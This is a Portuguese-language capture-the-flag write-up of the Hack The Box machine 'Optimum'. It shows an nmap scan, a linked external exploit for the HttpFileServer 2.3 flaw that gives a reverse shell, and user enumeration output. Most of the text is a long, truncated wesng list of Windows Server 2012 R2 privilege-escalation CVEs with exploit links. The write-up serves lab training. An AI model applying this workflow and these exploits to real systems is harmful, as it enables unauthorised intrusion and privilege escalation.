---
title:     "Hack The Box - Optimum"
tags: [windows,easy]
categories: HackTheBox
---

![1.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-optimum/1.jpg)

Voce pode acessar a maquina atraves deste link: https://www.hackthebox.eu/home/machines/profile/6

## Enumeration

Como de costume, iniciamos usando o nmap pois eh a fase inicial de enumeracao. e eh de extrema importancia!

```
root@kali:~/HTB-Windows/optimum# nmap -Pn -sV -p- -oN nmap/initial 10.10.10.8
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-22 22:50 EDT
Nmap scan report for 10.10.10.8
Host is up (0.19s latency).
Not shown: 65534 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    HttpFileServer httpd 2.3
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 374.86 seconds
```

Conforme o resultado do nmap, de todas as portas tcp encontramos apenas a port 80 aberta e nela tem um servico interessante...
**HttpFileServer httpd 2.3**

Antes de continuar com a enumeracao vamos verificar se existe algum exploit pra esse servico.

![2.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-optimum/2.jpg)

Realmente, existe exploit pra esse servico em especial. Porem, estou com problemas de instabilidade com a maquina. :/

Depois de reiniciar a maquina, ela volta a funcionar perfeitamente..

Uma breve pesquisa por exploits prontos, encontro rapidamente um funcional e em seguida ja tenho uma reverse shell.

## Exploitation

***reference:*** https://gist.githubusercontent.com/AfroThundr3007730/834858b381634de8417f301620a2ccf9/raw/783473905951169e49afaf5958e89b23f5a8743f/cve-2014-6287.py

lembre-se de ler o codigo e ajustar de acordo com sua necessidades..

![3.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-optimum/3.jpg)

## Privilege Escalation

Vamos iniciar a fase de escalacao de privilegio, seguindo a estrategia vamos identificar quais permissoes nosso user tem

```
C:\Users\kostas\Desktop>whoami                                                       
whoami                                    
optimum\kostas                            

C:\Users\kostas\Desktop>net user kostas
net user kostas
User name                    kostas
Full Name                    kostas
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            18/3/2017 2:56:19 
Password expires             Never
Password changeable          18/3/2017 2:56:19 
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   29/6/2020 3:23:22 

Logon hours allowed          All

Local Group Memberships      *Users                 
Global Group memberships     *None                  
The command completed successfully.


C:\Users\kostas\Desktop>
```
Agora, vamos ver se temos a possibilidade de exploits de kernel...

Usando o **systeminfo** pegamos a informacoes sobre o sistema operacional e em seguida transferir para meu local host usando o smbserver do impacket

![4.jpg](https://raw.githubusercontent.com/an4kein/an4kein.github.io/master/img/htb-optimum/4.jpg)

Depois de estarmos com essas informacoes em nosso localhost, usaremos o https://github.com/bitsadmin/wesng/ para verificar se existe alguma exploracao.

```
root@kali:~/HTB-Windows/optimum# python /opt/windowsPrivEsc/wesng/wes.py --update
Windows Exploit Suggester 0.98 ( https://github.com/bitsadmin/wesng/ )
[+] Updating definitions
[+] Obtained definitions created at 20200616
root@kali:~/HTB-Windows/optimum# python /opt/windowsPrivEsc/wesng/wes.py systeminfo.txt -i 'Elevation of Privilege' --exploits-only >> exploits_sugest.txt
```

E agora vamos ver se existe..

```
Windows Exploit Suggester 0.98 ( https://github.com/bitsadmin/wesng/ )
[+] Parsing systeminfo output
[+] Operating System
    - Name: Windows Server 2012 R2
    - Generation: 2012 R2
    - Build: 9600
    - Version: None
    - Architecture: x64-based
    - Installed hotfixes (31): KB2959936, KB2896496, KB2919355, KB2920189, KB2928120, KB2931358, KB2931366, KB2933826, KB2938772, KB2949621, KB2954879, KB2958262, KB2958263, KB2961072, KB2965500, KB2966407, KB2967917, KB2971203, KB2971850, KB2973351, KB2973448, KB2975061, KB2976627, KB2977629, KB2981580, KB2987107, KB2989647, KB2998527, KB3000850, KB3003057, KB3014442
[+] Loading definitions
    - Creation date of definitions: 20200616
[+] Determining missing patches
[+] Filtering duplicate vulnerabilities
[+] Applying display filters
[+] Found vulnerabilities

Date: 20170314
CVE: CVE-2017-0100
KB: KB4012213
Title: Windows COM Session Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/41607/

Date: 20170511
CVE: CVE-2017-0214
KB: KB4019213
Title: Windows COM Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Windows COM
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/42021/

Date: 20170411
CVE: CVE-2017-0211
KB: KB4015547
Title: Windows OLE Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/41902/

Date: 20170511
CVE: CVE-2017-0213
KB: KB4019213
Title: Windows COM Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Windows COM
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/42020/

Date: 20190409
CVE: CVE-2019-0805
KB: KB4493467
Title: Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46717/

Date: 20190409
CVE: CVE-2019-0805
KB: KB4493467
Title: Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46717/

Date: 20190409
CVE: CVE-2019-0805
KB: KB4493467
Title: Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46717/

Date: 20190409
CVE: CVE-2019-0805
KB: KB4493467
Title: Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46717/

Date: 20190409
CVE: CVE-2019-0796
KB: KB4493467
Title: Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46715/

Date: 20190409
CVE: CVE-2019-0796
KB: KB4493467
Title: Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46715/

Date: 20190409
CVE: CVE-2019-0796
KB: KB4493467
Title: Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46715/

Date: 20190409
CVE: CVE-2019-0796
KB: KB4493467
Title: Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46715/

Date: 20190108
CVE: CVE-2019-0570
KB: KB4480964
Title: Windows Runtime Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46184/

Date: 20190108
CVE: CVE-2019-0570
KB: KB4480964
Title: Windows Runtime Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46184/

Date: 20190108
CVE: CVE-2019-0570
KB: KB4480964
Title: Windows Runtime Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46184/

Date: 20190108
CVE: CVE-2019-0570
KB: KB4480964
Title: Windows Runtime Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46184/

Date: 20170511
CVE: CVE-2017-0263
KB: KB4019213
Title: Win32k Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Windows Kernel-Mode Drivers
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/44478/

Date: 20160510
CVE: CVE-2016-0173
KB: KB3156017
Title: Security Update for Windows Kernel-Mode Drivers
Affected product: Windows Server 2012 R2
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/39960/

Date: 20160510
CVE: CVE-2016-0173
KB: KB3156017
Title: Security Update for Windows Kernel-Mode Drivers
Affected product: Windows Server 2012 R2 (server core installation)
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/39960/

Date: 20160510
CVE: CVE-2016-0171
KB: KB3156017
Title: Security Update for Windows Kernel-Mode Drivers
Affected product: Windows Server 2012 R2
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/39959/

Date: 20160510
CVE: CVE-2016-0171
KB: KB3156017
Title: Security Update for Windows Kernel-Mode Drivers
Affected product: Windows Server 2012 R2 (server core installation)
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/39959/

Date: 20160913
CVE: CVE-2016-3371
KB: KB3175024
Title: Security Update for Windows Kernel
Affected product: Windows Server 2012 R2
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/40429/

Date: 20160913
CVE: CVE-2016-3371
KB: KB3175024
Title: Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Windows Kernel
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/40429/

Date: 20160913
CVE: CVE-2016-3373
KB: KB3175024
Title: Security Update for Windows Kernel
Affected product: Windows Server 2012 R2
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/40430/

Date: 20160913
CVE: CVE-2016-3373
KB: KB3175024
Title: Windows Kernel Local Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Windows Kernel
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/40430/

Date: 20161108
CVE: CVE-2016-7255
KB: KB3197873
Title: Security Update for Windows Kernel-Mode Drivers
Affected product: Windows Server 2012 R2
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploits: https://www.exploit-db.com/exploits/40745/, https://www.exploit-db.com/exploits/40823/, https://www.exploit-db.com/exploits/41015/

Date: 20161213
CVE: CVE-2016-7255
KB: KB3197874
Title: Win32k Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Windows Kernel-Mode Drivers
Severity: Important
Impact: Elevation of Privilege
Exploits: https://www.exploit-db.com/exploits/40745/, https://www.exploit-db.com/exploits/40823/, https://www.exploit-db.com/exploits/41015/

Date: 20161213
CVE: CVE-2016-7255
KB: KB3197873
Title: Win32k Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Windows Kernel-Mode Drivers
Severity: Important
Impact: Elevation of Privilege
Exploits: https://www.exploit-db.com/exploits/40745/, https://www.exploit-db.com/exploits/40823/, https://www.exploit-db.com/exploits/41015/

Date: 20161011
CVE: CVE-2016-3387
KB: KB3192392
Title: Microsoft Browser Elevation of Privilege Vulnerability
Affected product: Internet Explorer 11 on Windows Server 2012 R2
Affected component: Microsoft Browsers
Severity: Low
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/40607/

Date: 20161011
CVE: CVE-2016-3388
KB: KB3192392
Title: Microsoft Browser Elevation of Privilege Vulnerability
Affected product: Internet Explorer 11 on Windows Server 2012 R2
Affected component: Microsoft Browsers
Severity: Low
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/40606/

Date: 20150714
CVE: CVE-2015-2370
KB: KB3067505
Title: Vulnerability in Windows Remote Procedure Call Could Allow Elevation of Privilege
Affected product: Windows Server 2012 R2
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/37768/

Date: 20150714
CVE: CVE-2015-2370
KB: KB3067505
Title: Vulnerability in Windows Remote Procedure Call Could Allow Elevation of Privilege
Affected product: Windows Server 2012 R2 (server core installation)
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/37768/

Date: 20150512
CVE: CVE-2015-1701
KB: KB3045171
Title: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege
Affected product: Windows Server 2012 R2
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploits: https://www.exploit-db.com/exploits/37049/, https://www.exploit-db.com/exploits/37367/

Date: 20150512
CVE: CVE-2015-1701
KB: KB3045171
Title: Vulnerabilities in Windows Kernel-Mode Drivers Could Allow Elevation of Privilege
Affected product: Windows Server 2012 R2 (server core installation)
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploits: https://www.exploit-db.com/exploits/37049/, https://www.exploit-db.com/exploits/37367/

Date: 20181004
CVE: CVE-2018-8468
KB: KB4457143
Title: Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Windows Shell
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/45502/

Date: 20180508
CVE: CVE-2018-8134
KB: KB4103715
Title: Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Windows Kernel
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/44630/

Date: 20190409
CVE: CVE-2019-0730
KB: KB4493467
Title: Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46713/

Date: 20190409
CVE: CVE-2019-0730
KB: KB4493467
Title: Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46713/

Date: 20190409
CVE: CVE-2019-0730
KB: KB4493467
Title: Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46713/

Date: 20190409
CVE: CVE-2019-0730
KB: KB4493467
Title: Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46713/

Date: 20190409
CVE: CVE-2019-0735
KB: KB4493467
Title: Windows CSRSS Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: CSRSS
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46712/

Date: 20190409
CVE: CVE-2019-0735
KB: KB4493467
Title: Windows CSRSS Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: CSRSS
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46712/

Date: 20190409
CVE: CVE-2019-0735
KB: KB4493467
Title: Windows CSRSS Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: CSRSS
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46712/

Date: 20190409
CVE: CVE-2019-0735
KB: KB4493467
Title: Windows CSRSS Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: CSRSS
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46712/

Date: 20161011
CVE: CVE-2016-0079
KB: KB3192392
Title: Security Update for Windows Registry
Affected product: Windows Server 2012 R2
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/40608/

Date: 20161011
CVE: CVE-2016-0075
KB: KB3192392
Title: Security Update for Windows Registry
Affected product: Windows Server 2012 R2
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/40573/

Date: 20161213
CVE: CVE-2016-0075
KB: KB3192392
Title: Windows Kernel Local Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Windows Registry
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/40573/

Date: 20161011
CVE: CVE-2016-0073
KB: KB3192392
Title: Security Update for Windows Registry
Affected product: Windows Server 2012 R2
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/40574/

Date: 20161213
CVE: CVE-2016-0073
KB: KB3192392
Title: Windows Kernel Local Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Windows Registry
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/40574/

Date: 20181009
CVE: CVE-2018-8453
KB: KB4462941
Title: Win32k Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Graphics Component
Severity: Important
Impact: Elevation of Privilege
Exploit: https://securelist.com/cve-2018-8453-used-in-targeted-attack

Date: 20150908
CVE: CVE-2015-2528
KB: KB3084135
Title: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege
Affected product: Windows Server 2012 R2 (server core installation)
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/38201/

Date: 20150908
CVE: CVE-2015-2528
KB: KB3082089
Title: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege
Affected product: Windows Server 2012 R2 (server core installation)
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/38201/

Date: 20150908
CVE: CVE-2015-2528
KB: KB3084135
Title: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege
Affected product: Windows Server 2012 R2
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/38201/

Date: 20150908
CVE: CVE-2015-2528
KB: KB3082089
Title: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege
Affected product: Windows Server 2012 R2
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/38201/

Date: 20150908
CVE: CVE-2015-2524
KB: KB3084135
Title: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege
Affected product: Windows Server 2012 R2 (server core installation)
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/38202/

Date: 20150908
CVE: CVE-2015-2524
KB: KB3082089
Title: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege
Affected product: Windows Server 2012 R2 (server core installation)
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/38202/

Date: 20150908
CVE: CVE-2015-2524
KB: KB3084135
Title: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege
Affected product: Windows Server 2012 R2
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/38202/

Date: 20150908
CVE: CVE-2015-2524
KB: KB3082089
Title: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege
Affected product: Windows Server 2012 R2
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/38202/

Date: 20150908
CVE: CVE-2015-2525
KB: KB3084135
Title: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege
Affected product: Windows Server 2012 R2 (server core installation)
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/38200/

Date: 20150908
CVE: CVE-2015-2525
KB: KB3082089
Title: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege
Affected product: Windows Server 2012 R2 (server core installation)
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/38200/

Date: 20150908
CVE: CVE-2015-2525
KB: KB3084135
Title: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege
Affected product: Windows Server 2012 R2
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/38200/

Date: 20150908
CVE: CVE-2015-2525
KB: KB3082089
Title: Vulnerabilities in Windows Task Management Could Allow Elevation of Privilege
Affected product: Windows Server 2012 R2
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/38200/

Date: 20170411
CVE: CVE-2017-0165
KB: KB4015547
Title: Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/41901/

Date: 20180911
CVE: CVE-2018-8440
KB: KB4457143
Title: Windows ALPC Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://blog.0patch.com/2018/08/how-we-micropatched-publicly-dropped.html

Date: 20160308
CVE: CVE-2016-0099
KB: KB3139914
Title: Security Update for Secondary Logon to Address Elevation of Privile
Affected product: Windows Server 2012 R2
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploits: https://www.exploit-db.com/exploits/39574/, https://www.exploit-db.com/exploits/39719/, https://www.exploit-db.com/exploits/39809/, https://www.exploit-db.com/exploits/40107/

Date: 20160614
CVE: CVE-2016-3219
KB: KB3164035
Title: Security Update for Microsoft Graphics Component
Affected product: Windows Server 2012 R2
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/39993/

Date: 20160614
CVE: CVE-2016-3219
KB: KB3164035
Title: Security Update for Microsoft Graphics Component
Affected product: Windows Server 2012 R2 (server core installation)
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/39993/

Date: 20150113
CVE: CVE-2015-0002
KB: KB3023266
Title: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege
Affected product: Windows Server 2012 R2
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://code.google.com/p/google-security-research/issues/detail?id=118

Date: 20150113
CVE: CVE-2015-0002
KB: KB3023266
Title: Vulnerability in Windows Application Compatibility Cache Could Allow Elevation of Privilege
Affected product: Windows Server 2012 R2 (server core installation)
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://code.google.com/p/google-security-research/issues/detail?id=118

Date: 20150113
CVE: CVE-2015-0004
KB: KB3021674
Title: Vulnerability in Windows User Profile Service Could Allow Elevation of Privilege
Affected product: Windows Server 2012 R2 (server core installation)
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://code.google.com/p/google-security-research/issues/detail?id=123

Date: 20150113
CVE: CVE-2015-0004
KB: KB3021674
Title: Vulnerability in Windows User Profile Service Could Allow Elevation of Privilege
Affected product: Windows Server 2012 R2
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://code.google.com/p/google-security-research/issues/detail?id=123

Date: 20181113
CVE: CVE-2018-8550
KB: KB4467703
Title: Windows COM Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/45893/

Date: 20150113
CVE: CVE-2015-0016
KB: KB3019978
Title: Vulnerability in Windows Components Could Allow Elevation of Privilege
Affected product: Windows Server 2012 R2
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploits: http://blog.trendmicro.com/trendlabs-security-intelligence/cve-2015-0016-escaping-the-internet-explorer-sandbox/, http://packetstormsecurity.com/files/130201/MS15-004-Microsoft-Remote-Desktop-Services-Web-Proxy-IE-Sandbox-Escape.html, http://www.exploit-db.com/exploits/35983

Date: 20150113
CVE: CVE-2015-0016
KB: KB3019978
Title: Vulnerability in Windows Components Could Allow Elevation of Privilege
Affected product: Windows Server 2012 R2 (server core installation)
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploits: http://blog.trendmicro.com/trendlabs-security-intelligence/cve-2015-0016-escaping-the-internet-explorer-sandbox/, http://packetstormsecurity.com/files/130201/MS15-004-Microsoft-Remote-Desktop-Services-Web-Proxy-IE-Sandbox-Escape.html, http://www.exploit-db.com/exploits/35983

Date: 20180103
CVE: CVE-2018-0744
KB: KB4056898
Title: Windows Kernel Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Windows Kernel
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/43446/

Date: 20180103
CVE: CVE-2018-0749
KB: KB4056898
Title: SMB Server Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Windows SMB Server
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/43517/

Date: 20180122
CVE: CVE-2018-0748
KB: KB4056898
Title: Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Windows Kernel
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/43514/

Date: 20181009
CVE: CVE-2018-8411
KB: KB4462941
Title: NTFS Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/45624/

Date: 20181004
CVE: CVE-2018-8410
KB: KB4457143
Title: Windows Registry Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/45436/

Date: 20190409
CVE: CVE-2019-0731
KB: KB4493467
Title: Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46714/

Date: 20190409
CVE: CVE-2019-0731
KB: KB4493467
Title: Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46714/

Date: 20190409
CVE: CVE-2019-0731
KB: KB4493467
Title: Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46714/

Date: 20190409
CVE: CVE-2019-0731
KB: KB4493467
Title: Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Microsoft Windows
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/46714/

Date: 20160818
CVE: CVE-2016-3225
KB: KB3161561
Title: Windows SMB Server Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Windows SMB Server
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/45562/

Date: 20160614
CVE: CVE-2016-3223
KB: KB3159398
Title: Group Policy Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Group Policy
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/40219/

Date: 20160614
CVE: CVE-2016-3220
KB: KB3164035
Title: Security Update for Microsoft Graphics Component
Affected product: Windows Server 2012 R2
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/39991/

Date: 20160614
CVE: CVE-2016-3220
KB: KB3164035
Title: Security Update for Microsoft Graphics Component
Affected product: Windows Server 2012 R2 (server core installation)
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/39991/

Date: 20180122
CVE: CVE-2018-0751
KB: KB4056898
Title: Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Windows Kernel
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/43515/

Date: 20180122
CVE: CVE-2018-0752
KB: KB4056898
Title: Windows Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Windows Kernel
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/43516/

Date: 20161011
CVE: CVE-2016-7185
KB: KB3192392
Title: Security Update for Windows Kernel-Mode Drivers
Affected product: Windows Server 2012 R2
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/40572/

Date: 20161213
CVE: CVE-2016-7185
KB: KB3192392
Title: Win32k Elevation of Privilege Vulnerability
Affected product: Windows Server 2012 R2
Affected component: Windows Kernel-Mode Drivers
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/40572/

Date: 20161108
CVE: CVE-2016-7226
KB: KB3197873
Title: Security Update to Microsoft Virtual Hard Drive
Affected product: Windows Server 2012 R2
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/40763/

Date: 20161108
CVE: CVE-2016-7225
KB: KB3197873
Title: Security Update to Microsoft Virtual Hard Drive
Affected product: Windows Server 2012 R2
Affected component: 
Severity: Important
Impact: Elevation of Privilege
Exploit: https://www.exploit-db.com/exploits/40764/

Date: 20161108
CVE: CVE-2016-7224
KB: KB3197873
Title: Security Update to Microsoft Virtual Hard Drive
Affected product: Windows Server 2012 R2
Affected component: 
Severity: Important
